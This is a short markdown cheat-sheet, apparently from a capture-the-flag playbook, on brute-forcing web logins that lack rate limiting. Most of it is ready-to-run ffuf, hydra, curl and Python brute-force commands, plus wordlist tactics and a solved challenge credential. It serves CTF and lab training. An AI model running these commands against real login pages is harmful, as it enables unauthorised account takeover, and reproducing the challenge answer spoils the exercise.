# Online password guessing (CWE-307 no rate limit)

**Signs**: known username, no password; repeated wrong logins get no delay/lockout/CAPTCHA;
hint "try the door all night", "Dictionary".

## 1. Check for rate limiting
Send ~10 wrong logins quickly — same status/time each time and no "locked" message ⇒ go.

## 2. Learn the failure signature
```bash
curl -si -d 'username=vpnuser&password=wrong' $T/login | head -20
```
Note: status code, redirect `Location`, response size, error string. Success differs in one.

## 3. Attack
```bash
# ffuf (fast). Filter out the failure size / string.
ffuf -u $T/login -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=vpnuser&password=FUZZ' -w wordlists/passwords/top-1000.txt -fr 'Invalid|incorrect' 
# or match the success redirect
ffuf ... -mc 302

# hydra
hydra -l vpnuser -P wordlists/passwords/top-1000.txt -s 8072 auth13.chal.deti \
      http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'

# python (handles CSRF tokens / sessions / success check on another page)
python scripts/auth/login_brute.py $T/login -u vpnuser -P wordlists/passwords/top-1000.txt \
      --user-field username --pass-field password --success-url $T/dashboard --success-text flag{
```
Full tool pages: [ffuf](../tools/ffuf.md), [hydra](../tools/hydra.md).

## Which wordlist?
1. `top-100.txt` / `top-1000.txt` (seconds) — "most used passwords in the world" → `qwerty`, `123456`.
2. Context words: company/product name, season+year (`Summer2024`), `Welcome1`, `Password123`.
   `python scripts/auth/mutate.py brightleaf 2024 > ctx.txt` generates variants.
3. `10k-most-common.txt`, then rockyou (`wordlists/fetch_big.sh`).

## CSRF token on the form?
Each attempt must GET the form, scrape the token, then POST → use `login_brute.py --csrf-field <name>`.

Seen in: `auth13` (`vpnuser` / `qwerty`, no rate limit), DVWA "Brute Force" module.
